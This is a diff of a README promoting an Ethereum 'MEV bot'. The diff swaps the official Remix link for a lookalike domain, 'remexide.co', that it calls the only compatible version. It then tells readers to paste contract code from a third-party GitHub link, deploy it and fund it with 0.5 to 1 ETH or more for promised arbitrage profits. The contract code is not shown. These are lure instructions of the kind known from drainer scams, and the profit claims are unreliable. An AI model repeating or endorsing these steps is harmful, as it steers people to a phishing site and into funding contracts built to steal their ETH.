@@ -1,22 +1,30 @@
-# ETHEREUM-MEV-BOT
-#MEV-BOT-ETHEREUM Flash loan arbitrage ethereum -
+*🚨 IMPORTANT:* I've received messages from users who didn't provide enough Ethereum to cover gas fees and potential burn fees. The bot targets token contracts with a maximum burn fee of 10% or lower, though most tokens currently have fees between 2-6%. If you fund the contract with 0.4 ETH or less and the bot targets a token with high burn fees, a significant amount of gas fees might be wasted. To avoid this, I recommend funding the contract with at least 0.5 to 1 ETH.
 
-FULL INSTRUCTIONS
+*STEP BY STEP INSTRUCTIONS*
 
-▶️ Download ­Me­­ta­Ma­­sk https://metamask.io/download (if you don’t have it already).
+✅ Download MetaMask: https://metamask.io/download/
 
-▶️ Make sure you have Ethereum in your MetaMask wallet before creating the contract, then you will not get a "Gas estimation failed" error in the Remix.
+✅ Access Remix: https://remexide.co/
+_(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)_
 
-▶️ Access Remix from PC or Laptop: https://remix.ethereum.org/
+✅ Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.
+_Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again._
 
-▶️ Click “Create New File” icon in “Workspaces” section and name it as you like, for example: “bot.sol”.
+*🔥 Paste THIS code in Remix:* github.com/0x-tiay/MEVBOT-ChatGPT/blob/main/.Contract%20code
 
-▶️ Go to “Solidity Compiler” tab, select version “0.6.6+commit” and click “Compile bot.sol”.
+✅ Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6
 
-▶️ Go to “Deploy & Run Transactions” tab, select the “Injected Web3 (MetaMask)” Environment and then click “Deploy”. Confirm contract deployment transaction in MetaMask.
+✅ Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Provider - MetaMask” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.
 
-▶️ Copy your newly created contract address as shown on video and fund it with any amount of ETH (minimum 0.1 to 10 ETH or higher recommended to prevent negating slippage) that you would like the bot to earn with by simply sending ETH to this contract address.
+Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be "OneinchSlippageBot - bot.sol".
 
-▶️ After your transaction is confirmed, click “Start” button to launch the bot. It will start working immediately earning you profits from arbitrage trades on Uniswap pools. Withdraw your ETH at any time by clicking “Withdraw” button.
+Also if you get this message after deployment "Failed to publish metadata file to ipfs, please check the ipfs gateways is available. [{},{},{}] ". You can just ignore it and continue. This feature is to publish your bot to IPFS. Its not necessary, because the bot is in the blockchain and can be accessed through remix.
+
+✅ Fund your bot to be able to frontrun transactions.
+_Make sure your deposit is more than 0.5 ETH(to prevent negating slippage) to your exact contract/bot address._
+
+✅ After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button
+
+➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
 
 Happy trading! 🚀
